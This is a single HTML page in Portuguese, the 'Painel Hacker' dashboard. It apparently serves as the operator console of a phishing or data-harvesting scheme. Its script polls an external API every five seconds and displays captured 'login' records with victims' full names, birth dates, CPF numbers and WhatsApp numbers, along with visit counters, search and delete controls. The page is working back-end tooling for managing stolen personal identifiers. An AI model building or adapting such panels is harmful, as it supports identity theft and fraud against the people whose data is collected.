<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PAINEL // ACESSO RESTRITO</title>
  <link rel="icon" type="image/png" href="favicon.png">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Consolas', 'Courier New', monospace;
      background: #000;
      color: #00ff41;
      padding: 20px;
      min-height: 100vh;
      text-shadow: 0 0 5px rgba(0,255,65,0.7);
    }

    .terminal-bar {
      background: #0a0a0a;
      border: 1px solid #00ff41;
      border-radius: 8px 8px 0 0;
      padding: 8px 14px;
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 12px;
      margin-bottom: -1px;
    }
    .dot-vermelho, .dot-amarelo, .dot-verde {
      width: 12px; height: 12px; border-radius: 50%;
      display: inline-block;
    }
    .dot-vermelho { background: #ff5f56; }
    .dot-amarelo { background: #ffbd2e; }
    .dot-verde { background: #27c93f; }
    .terminal-titulo {
      margin-left: 10px;
      color: #00ff41;
      font-size: 12px;
      letter-spacing: 1px;
    }

    .header {
      border: 1px solid #00ff41;
      border-radius: 0 0 8px 8px;
      padding: 18px;
      margin-bottom: 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 12px;
      background: rgba(0,255,65,0.03);
    }
    h1 {
      font-size: 20px;
      letter-spacing: 2px;
      text-transform: uppercase;
    }
    h1::before { content: '> '; }
    h1::after {
      content: '_';
      animation: blink 1s infinite;
    }
    @keyframes blink {
      0%, 50% { opacity: 1; }
      51%, 100% { opacity: 0; }
    }
    .status { font-size: 13px; color: #00ff41; letter-spacing: 1px; }
    .dot {
      display: inline-block; width: 9px; height: 9px;
      border-radius: 50%; background: #00ff41; margin-right: 6px;
      box-shadow: 0 0 8px #00ff41;
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }

    .cards-top {
      display: flex; gap: 14px; flex-wrap: wrap; margin-bottom: 20px;
    }
    .card-top {
      background: #050505;
      border: 1px solid #00ff41;
      padding: 18px;
      border-radius: 6px;
      flex: 1; min-width: 150px;
      box-shadow: 0 0 15px rgba(0,255,65,0.2);
      position: relative;
      overflow: hidden;
    }
    .card-top::before {
      content: '';
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 2px;
      background: linear-gradient(90deg, transparent, #00ff41, transparent);
      animation: scan 3s linear infinite;
    }
    @keyframes scan {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }
    .card-top .num {
      font-size: 32px;
      font-weight: bold;
      color: #00ff41;
      text-shadow: 0 0 10px #00ff41;
    }
    .card-top .lbl {
      font-size: 11px;
      color: #00aa2b;
      text-transform: uppercase;
      margin-top: 6px;
      letter-spacing: 1.5px;
    }

    .controles { display: flex; gap: 10px; margin-bottom: 14px; flex-wrap: wrap; }
    button {
      padding: 9px 16px;
      border: 1px solid #00ff41;
      background: transparent;
      color: #00ff41;
      border-radius: 4px;
      font-size: 13px;
      cursor: pointer;
      font-weight: 600;
      font-family: inherit;
      letter-spacing: 1px;
      text-transform: uppercase;
      transition: all 0.2s;
    }
    button:hover {
      background: #00ff41;
      color: #000;
      box-shadow: 0 0 15px #00ff41;
    }
    .btn-del-all {
      border-color: #ff3b3b;
      color: #ff3b3b;
    }
    .btn-del-all:hover {
      background: #ff3b3b;
      color: #000;
      box-shadow: 0 0 15px #ff3b3b;
    }
    .btn-del {
      border-color: #ff3b3b;
      color: #ff3b3b;
      padding: 5px 12px;
      font-size: 11px;
    }
    .btn-del:hover {
      background: #ff3b3b;
      color: #000;
      box-shadow: 0 0 15px #ff3b3b;
    }

    .busca {
      width: 100%;
      padding: 11px;
      background: #050505;
      border: 1px solid #00ff41;
      border-radius: 4px;
      font-size: 14px;
      margin-bottom: 14px;
      color: #00ff41;
      font-family: inherit;
      letter-spacing: 1px;
    }
    .busca::placeholder { color: #00aa2b; }
    .busca:focus {
      outline: none;
      box-shadow: 0 0 15px rgba(0,255,65,0.4);
    }

    .lista { display: flex; flex-direction: column; gap: 14px; }

    .cadastro {
      background: #050505;
      border: 1px solid #00ff41;
      border-radius: 6px;
      overflow: hidden;
      box-shadow: 0 0 15px rgba(0,255,65,0.15);
    }
    .cadastro-header {
      display: flex; justify-content: space-between;
      align-items: center; gap: 10px;
      padding: 14px 18px;
      background: rgba(0,255,65,0.08);
      border-bottom: 1px solid #00ff41;
      flex-wrap: wrap;
    }
    .cadastro-nome {
      font-size: 16px;
      font-weight: bold;
      color: #00ff41;
      letter-spacing: 1px;
      text-shadow: 0 0 8px rgba(0,255,65,0.6);
    }
    .cadastro-nome::before { content: '[USER] '; color: #00aa2b; font-size: 12px; }
    .cadastro-data { font-size: 11px; color: #00aa2b; letter-spacing: 1px; }

    .bloco-titulo {
      padding: 8px 18px;
      background: rgba(0,255,65,0.12);
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      color: #00ff41;
      letter-spacing: 2px;
      border-bottom: 1px solid #00ff41;
    }
    .bloco-titulo::before { content: '$ '; }

    .cadastro-body {
      padding: 16px 18px;
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
      gap: 14px;
    }
    .campo { font-size: 13px; }
    .campo .rotulo {
      color: #00aa2b;
      font-size: 10px;
      text-transform: uppercase;
      font-weight: 600;
      margin-bottom: 3px;
      letter-spacing: 1.5px;
    }
    .campo .rotulo::before { content: '> '; }
    .campo .valor {
      color: #00ff41;
      word-break: break-word;
      font-size: 14px;
    }
    .campo.full { grid-column: 1 / -1; }

    .vazio {
      text-align: center;
      padding: 40px;
      color: #00aa2b;
      letter-spacing: 2px;
      border: 1px dashed #00aa2b;
      border-radius: 6px;
    }
    .botoes-card {
      padding: 10px 18px;
      border-top: 1px solid #00ff41;
      display: flex; justify-content: flex-end;
    }

    ::-webkit-scrollbar { width: 10px; height: 10px; }
    ::-webkit-scrollbar-track { background: #000; }
    ::-webkit-scrollbar-thumb { background: #00aa2b; border-radius: 5px; }
    ::-webkit-scrollbar-thumb:hover { background: #00ff41; }
  </style>
</head>
<body>

  <div class="terminal-bar">
    <span class="dot-vermelho"></span>
    <span class="dot-amarelo"></span>
    <span class="dot-verde"></span>
    <span class="terminal-titulo">root@gets-invio-on:~$ ./painel.sh</span>
  </div>

  <div class="header">
    <h1>Painel Hacker</h1>
    <div class="status"><span class="dot"></span>SYSTEM ONLINE // AUTO-REFRESH 5s</div>
  </div>

  <div class="cards-top">
    <div class="card-top">
      <div class="num" id="total-visitas">0</div>
      <div class="lbl">Total de visitas</div>
    </div>
    <div class="card-top">
      <div class="num" id="visitas-hoje">0</div>
      <div class="lbl">Visitas hoje</div>
    </div>
    <div class="card-top">
      <div class="num" id="total">0</div>
      <div class="lbl">Total de cadastros</div>
    </div>
    <div class="card-top">
      <div class="num" id="hoje">0</div>
      <div class="lbl">Cadastros hoje</div>
    </div>
  </div>

  <div class="controles">
    <button class="btn-refresh" onclick="carregarTudo()">[ REFRESH ]</button>
    <button class="btn-del-all" onclick="apagarTudo()">[ DELETE ALL ]</button>
  </div>

  <input id="busca" class="busca" type="text" placeholder="> grep search..." oninput="filtrar()" />

  <div class="lista" id="lista"></div>

  <script>
    const API_URL = 'https://gets-invio-on-api.onrender.com';
    let todosDados = [];

    async function carregarVisitas() {
      try {
        const r = await fetch(API_URL + '/visitas');
        const { total, hoje } = await r.json();
        document.getElementById('total-visitas').textContent = total;
        document.getElementById('visitas-hoje').textContent = hoje;
      } catch (e) {
        document.getElementById('total-visitas').textContent = '-';
        document.getElementById('visitas-hoje').textContent = '-';
      }
    }

    async function carregar() {
      try {
        const r = await fetch(API_URL + '/dados');
        const { dados } = await r.json();
        todosDados = dados;

        document.getElementById('total').textContent = dados.length;

        const hoje = new Date().toDateString();
        const doDia = dados.filter(d => new Date(d.recebidoEm).toDateString() === hoje);
        document.getElementById('hoje').textContent = doDia.length;

        renderizar(dados);
      } catch (e) {
        document.getElementById('lista').innerHTML =
          '<div class="vazio">[!] CONEXAO FALHOU — servidor offline?</div>';
      }
    }

    function carregarTudo() {
      carregarVisitas();
      carregar();
    }

    function filtrar() {
      const termo = document.getElementById('busca').value.toLowerCase().trim();
      if (!termo) { renderizar(todosDados); return; }
      const filtrado = todosDados.filter(d =>
        (d.nome || '').toLowerCase().includes(termo) ||
        (d.whatsapp || '').toLowerCase().includes(termo) ||
        (d.cpf || '').toLowerCase().includes(termo)
      );
      renderizar(filtrado);
    }

    function esc(s) {
      return String(s == null ? '-' : s).replace(/[&<>"']/g, c => ({
        '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
      })[c]);
    }

    function formatarData(iso) {
      if (!iso) return '-';
      // Se for data simples (YYYY-MM-DD), formata como DD/MM/YYYY
      if (/^\d{4}-\d{2}-\d{2}$/.test(iso)) {
        const [a, m, d] = iso.split('-');
        return `${d}/${m}/${a}`;
      }
      return iso;
    }

    function renderizar(dados) {
      if (dados.length === 0) {
        document.getElementById('lista').innerHTML =
          '<div class="vazio">[ NENHUM REGISTRO ENCONTRADO ]</div>';
        return;
      }

      const html = dados.slice().reverse().map(d => `
        <div class="cadastro">
          <div class="cadastro-header">
            <div class="cadastro-nome">${esc(d.nome)}</div>
            <div class="cadastro-data">${new Date(d.recebidoEm).toLocaleString('pt-BR')}</div>
          </div>

          <div class="bloco-titulo">DADOS DO LOGIN</div>
          <div class="cadastro-body">
            <div class="campo"><div class="rotulo">Nome completo</div><div class="valor">${esc(d.nome)}</div></div>
            <div class="campo"><div class="rotulo">Data de nascimento</div><div class="valor">${formatarData(d.dataNascimento)}</div></div>
            <div class="campo"><div class="rotulo">CPF</div><div class="valor">${esc(d.cpf)}</div></div>
            <div class="campo"><div class="rotulo">WhatsApp</div><div class="valor">${esc(d.whatsapp)}</div></div>
          </div>

          <div class="botoes-card">
            <button class="btn-del" onclick="apagar(${d.id})">[ DELETE ]</button>
          </div>
        </div>
      `).join('');

      document.getElementById('lista').innerHTML = html;
    }

    async function apagar(id) {
      if (!confirm('DELETAR esse cadastro?')) return;
      await fetch(API_URL + '/dados/' + id, { method: 'DELETE' });
      carregar();
    }

    async function apagarTudo() {
      if (!confirm('⚠️ DELETAR TODOS os cadastros? Sem volta!')) return;
      await fetch(API_URL + '/dados', { method: 'DELETE' });
      carregar();
    }

    carregarVisitas();
    carregar();
    setInterval(() => { carregarVisitas(); carregar(); }, 5000);
  </script>
</body>
</html>
